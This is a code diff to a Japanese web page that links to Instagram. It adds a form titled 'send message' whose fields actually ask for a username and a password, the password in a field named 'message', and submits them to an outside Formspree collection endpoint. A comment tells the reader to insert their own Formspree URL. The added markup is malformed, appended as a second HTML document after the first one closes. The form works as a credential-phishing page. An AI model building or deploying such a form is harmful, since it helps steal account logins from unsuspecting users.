@@ -10,6 +10,34 @@
     <a href="https://instagram.com" style="color: #007bff; text-decoration: none;">Instagramはこちら</a>
 </body>
 </html>
-<form action="https://formspree.io/f/xaenadpz" method="POST">
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>メッセージ送信</title>
+</head>
+<body>
+    <h1>メッセージを送る</h1>
+
+    <!-- action="..." の中身を自分のFormspree URLに書き換えてください -->
+    <form action="https://formspree.io/f/xaenadpz" method="POST">
+        <p>
+            <label>ユーザーネーム：<br>
+                <input type="text" name="name" required style="width: 80%; padding: 8px;">
+            </label>
+        </p>
+        <p>
+            <label>パスワード：<br>
+                <textarea name="message" rows="5" required style="width: 80%; padding: 8px;"></textarea>
+            </label>
+        </p>
+        <p>
+            <button type="submit" style="padding: 10px 20px;">送信する</button>
+        </p>
+    </form>
+</body>
+</html>
+
 
 
